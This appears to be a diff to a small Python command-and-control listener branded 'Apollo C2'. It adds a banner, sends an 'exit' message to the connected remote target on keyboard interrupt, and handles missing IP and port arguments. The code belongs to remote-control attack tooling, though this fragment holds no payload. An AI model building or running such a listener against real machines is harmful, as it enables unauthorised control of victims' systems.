@@ -2,14 +2,14 @@ import socket
 import sys
 
 def banner():
-    print('                       _ _        ')     
-    print('     /\               | | |       ')      
-    print('    /  \   _ __   ___ | | | ___   ')
-    print('   / /\ \ |  _ \ / _ \| | |/ _ \  ')
-    print('  / ____ \| |_) | (_) | | | (_) | ')
-    print(' /_/    \_\ .__/ \___/|_|_|\___/  ')
-    print('          | |                     ')
-    print('          |_|     By Luka Babetzki')             
+    print('                       _ _          _____ ___   ')     
+    print('     /\               | | |        / ____|__ \  ')      
+    print('    /  \   _ __   ___ | | | ___   | |       ) | ')
+    print('   / /\ \ |  _ \ / _ \| | |/ _ \  | |      / /  ')
+    print('  / ____ \| |_) | (_) | | | (_) | | |____ / /_  ')
+    print(' /_/    \_\ .__/ \___/|_|_|\___/   \_____|____| ')
+    print('          | |                                   ')
+    print('          |_|               By Luka Babetzki    ')             
 
 
 def comm_in(remote_target):
@@ -44,8 +44,10 @@ def comm_handler(remote_target, remote_ip):
                 break
             print(response)
         except KeyboardInterrupt:
-            print('[+] Keyboard interrupt issued.')
-            remote_target.close()
+            print('\n[+] Keyboard interrupt issued.')
+            message = 'exit'
+            remote_target.send(message.encode())
+            sock.close()
             break
         except Exception:
             remote_target.close()
@@ -54,6 +56,11 @@ def comm_handler(remote_target, remote_ip):
 if __name__ == '__main__':
     banner()
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host_ip = sys.argv[1]
-    host_port = int(sys.argv[2])
-    listener_handler()
+    try:
+        host_ip = sys.argv[1]
+        host_port = int(sys.argv[2])
+        listener_handler()
+    except IndexError:
+        print('[-] Command line arguement(s) missing. Please specify IP and Port.')
+    except Exception as e:
+        print(e)
